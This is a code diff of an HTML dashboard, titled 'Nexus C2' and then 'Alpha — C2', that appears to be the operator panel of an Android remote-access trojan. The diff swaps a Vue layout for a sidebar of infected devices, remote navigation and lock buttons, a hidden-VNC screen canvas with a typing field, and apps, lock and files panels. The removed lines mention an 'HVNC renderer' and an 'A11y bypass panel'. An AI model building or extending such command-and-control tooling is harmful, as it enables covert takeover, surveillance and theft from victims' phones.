@@ -1,33 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Nexus C2</title>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⬡</text></svg>">
-  <link rel="stylesheet" href="/static/css/app.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Alpha — C2</title>
+<link rel="stylesheet" href="/css/app.css">
 </head>
 <body>
-  <div id="app"></div>
+<!-- ── Sidebar ──────────────────────────────────────────────────────────────── -->
+<aside class="sidebar">
+  <div class="logo">⟨ ALPHA ⟩</div>
+  <div class="sidebar-section">Devices</div>
+  <div id="devList" class="dev-list"></div>
+  <div class="sidebar-bottom">
+    <span id="statusDot" style="color:#ff4444">○ Offline</span>
+    <button class="btn-sm" id="btnLogout">Exit</button>
+  </div>
+</aside>
 
-  <!-- Vue 3 CDN (includes template compiler for in-browser compilation) -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.4.31/vue.global.prod.min.js"></script>
+<!-- ── Main ────────────────────────────────────────────────────────────────── -->
+<main class="main">
 
-  <!-- Command catalog (no dependency on dash state) -->
-  <script src="/static/js/commands.js"></script>
+  <!-- Header bar -->
+  <header class="header">
+    <span class="header-dev" id="activeDevice">No device selected</span>
+    <div class="nav-btns">
+      <button class="nav-btn" id="btnWake"    title="Wake">💡</button>
+      <button class="nav-btn" id="btnBack"    title="Back">◀</button>
+      <button class="nav-btn" id="btnHome"    title="Home">⌂</button>
+      <button class="nav-btn" id="btnRecents" title="Recents">⬛</button>
+      <button class="nav-btn" id="btnNotif"   title="Notifications">🔔</button>
+      <button class="nav-btn" id="btnLock"    title="Lock">🔒</button>
+      <button class="nav-btn" id="btnVolUp"   title="Vol +">🔊</button>
+      <button class="nav-btn" id="btnVolDn"   title="Vol −">🔉</button>
+    </div>
+    <div class="tab-bar">
+      <button class="tab active" data-panel="vnc">VNC</button>
+      <button class="tab" data-panel="ly">Ly</button>
+      <button class="tab" data-panel="apps">Apps</button>
+      <button class="tab" data-panel="lock">Lock</button>
+      <button class="tab" data-panel="files">Files</button>
+    </div>
+  </header>
 
-  <!-- HVNC renderer (GPU Worker decode pipeline) -->
-  <script src="/static/js/ly-reader.js"></script>
-  <script src="/static/js/hvnc.js"></script>
+  <!-- ── VNC Panel ─────────────────────────────────────────────────────────── -->
+  <div id="panelVnc" class="panel">
+    <div class="vnc-wrap">
+      <canvas id="vncCanvas" width="360" height="640" class="vnc-canvas"></canvas>
+    </div>
+    <div class="vnc-controls">
+      <label>Quality
+        <input type="range" id="vncQuality" min="15" max="85" value="50" />
+        <span id="vncQualityVal">50</span>
+      </label>
+      <label>FPS
+        <select id="vncFps">
+          <option value="8">8</option>
+          <option value="15">15</option>
+          <option value="20" selected>20</option>
+          <option value="30">30</option>
+        </select>
+      </label>
+      <span id="fpsCtr" class="fps-ctr">— fps</span>
+      <label class="type-wrap">Type:
+        <input id="typeInput" type="text" class="type-input"
+               placeholder="Type here (focus device first)" autocomplete="off" />
+      </label>
+    </div>
+    <div id="cmdLog" class="cmd-log"></div>
+  </div>
 
-  <!-- WS client -->
-  <script src="/static/js/ws-client.js"></script>
+  <!-- ── Ly Panel ──────────────────────────────────────────────────────────── -->
+  <div id="panelLy" class="panel" style="display:none">
+    <svg id="lySvg" class="ly-svg" xmlns="http://www.w3.org/2000/svg"></svg>
+  </div>
 
-  <!-- Main Vue 3 app -->
-  <script src="/static/js/app.js"></script>
+  <!-- ── Apps Panel ────────────────────────────────────────────────────────── -->
+  <div id="panelApps" class="panel" style="display:none"></div>
 
-  <!-- A11y bypass panel (optional, injected when bypass pane activates) -->
-  <script src="/static/js/bypass-panel.js"></script>
+  <!-- ── Lock Panel ────────────────────────────────────────────────────────── -->
+  <div id="panelLock" class="panel" style="display:none"></div>
 
+  <!-- ── Files Panel ───────────────────────────────────────────────────────── -->
+  <div id="panelFiles" class="panel" style="display:none"></div>
+
+</main>
+
+<script src="/js/ws-client.js"></script>
+<script src="/js/vnc-worker.js" type="text/javascript"></script>
+<script src="/js/vnc.js"></script>
+<script src="/js/ly-reader.js"></script>
+<script src="/js/app-manager.js"></script>
+<script src="/js/lock-manager.js"></script>
+<script src="/js/file-manager.js"></script>
+<script src="/js/dash.js"></script>
 </body>
 </html>
